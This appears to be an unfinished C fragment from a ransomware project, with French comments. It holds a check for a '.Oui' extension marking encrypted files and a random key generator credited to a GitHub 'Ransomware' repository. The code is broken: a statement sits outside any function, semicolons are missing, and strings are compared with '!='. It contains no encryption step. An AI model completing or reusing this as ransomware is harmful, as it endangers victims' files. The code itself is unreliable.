#include <dirent.h>
#include <stdio.h>

// lire l'ext

ext = strrchr(filename, '.'); //#include <string.h>
if (!ext){
    return //no ext & not encrypted
} else if (ext != ".Oui"){
        return //not encrypted
    } else {
        return //encrypted
    }
}

/* https://github.com/DaniAffCH/Ransomware/blob/main/lib/crypt.c */
char* generate_key(int length){
    char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";
    char *randomString = (char*) malloc(sizeof(char) * (length +1));
    int key;

    if (randomString) {
        for (int n = 0; n < length; n++) {
            key = rand() % (int)(sizeof(charset) -1);
            randomString[n] = charset[key];
        }
        randomString[length] = '\0';
    }

    return randomString;
}